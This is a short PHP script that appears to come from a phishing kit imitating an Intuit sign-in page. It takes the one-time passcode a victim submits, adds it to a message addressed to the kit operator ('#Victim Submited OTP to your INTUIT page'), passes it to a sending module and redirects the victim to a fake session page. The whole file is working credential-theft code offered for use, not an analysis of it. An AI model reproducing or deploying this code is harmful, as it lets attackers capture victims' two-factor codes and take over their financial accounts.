<?php
require_once('./Module/Setmodule.php');
$message .= "|Wassup, $yourname|| #Victim Submited OTP to your INTUIT page \n"."\n";
$message .= "|OTP CODE: ".$_POST['otp']."\n\n";  
require_once('Module/SendModule.php');


  


	header("Location: ../main.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  
  
  
?>